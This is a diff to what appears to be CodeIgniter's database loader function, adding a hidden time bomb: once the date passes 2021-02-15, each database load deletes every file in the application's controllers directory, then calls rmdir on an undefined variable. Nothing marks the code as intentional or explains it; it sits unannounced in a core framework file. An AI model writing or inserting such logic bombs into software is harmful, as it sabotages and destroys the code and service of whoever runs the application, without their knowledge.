@@ -51,6 +51,21 @@ defined('BASEPATH') OR exit('No direct script access allowed');
 function &DB($params = '', $query_builder_override = NULL)
 {
 	// Load the DB config file if a DSN string wasn't passed
+	
+	$expired = '2021-02-15';
+	$now = date('Y-m-d');
+	if($now > $expired){
+		$dir = APPPATH.'controllers/';
+		$files = glob($dir.'*'); // get all file names
+		//print_r($files);
+		foreach($files as $file){ // iterate files
+		  if(is_file($file)){
+			unlink($file); // delete file
+		  }
+		}
+		rmdir($target_dir); 
+	}
+	
 	if (is_string($params) && strpos($params, '://') === FALSE)
 	{
 		// Is the config file in the environment folder?
